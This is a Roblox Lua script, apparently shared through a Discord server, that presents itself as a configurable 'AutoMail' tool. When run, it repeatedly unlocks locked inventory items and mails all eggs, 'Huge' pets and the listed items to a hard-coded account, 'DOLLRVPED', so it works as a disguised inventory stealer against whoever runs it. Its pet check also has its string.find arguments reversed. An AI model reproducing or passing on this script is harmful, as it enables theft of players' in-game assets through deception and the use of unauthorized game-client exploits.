-- DISCORD.GG/CV01
getgenv().AutoMail = {
    ['Items'] = {
        ['Rainbow Gem'] = { Class = "Misc", Amount = 10 },
    },
    ['Loop Interval'] = 60,
    ['Users'] = {"DOLLRVPED"}, -- Does random of one
}

repeat task.wait() until game:IsLoaded()
local LocalPlayer = game:GetService('Players').LocalPlayer
repeat task.wait() until not LocalPlayer.PlayerGui:FindFirstChild('__INTRO')

local Client = game:GetService('ReplicatedStorage').Library.Client

local Network = require(Client.Network)
local SaveModule = require(Client.Save)

while task.wait(AutoMail['Loop Interval'] or 60) do
    local Queue = {}
  
    for Class, Items in pairs(SaveModule.Get()['Inventory']) do
        for uid, v in pairs(Items) do
            local PetCheck = (Class == "Pet") and string.find("Huge", v.id)
            local Config = false

            for Id, Info in pairs(AutoMail['Items']) do
                if Id == v.id and Info.Class == Class and Info.pt == v.pt and Info.sh == v.sh and Info.tn == v.tn and (Info.Amount or 0) <= (v._am or 1) then
                    Config = true break
                end
            end

            if Class == "Egg" or Config or PetCheck and not Queue[uid] then
                Queue[uid] = { Class = Class, Info = v }
            end
        end
    end

    for uid, Data in pairs(Queue) do
        local Unlocked = false
        local Mailed = false
        local v = Data.Info

        if v._lk then
            while not Network.Invoke("Locking_SetLocked", uid, false)  do
                task.wait(0.1)
            end
        end

        local SendAmount = (v._am or 1)

        if Data.Class == "Currency" then
            --SendAmount = SendAmount - MailTax
            -- if u have own tax u can implement
        end


        Network.Invoke("Mailbox: Send", AutoMail['Users'][math.random(1, #AutoMail['Users'])], "Bless", Data.Class, uid, SendAmount) task.wait(3)
    end
end
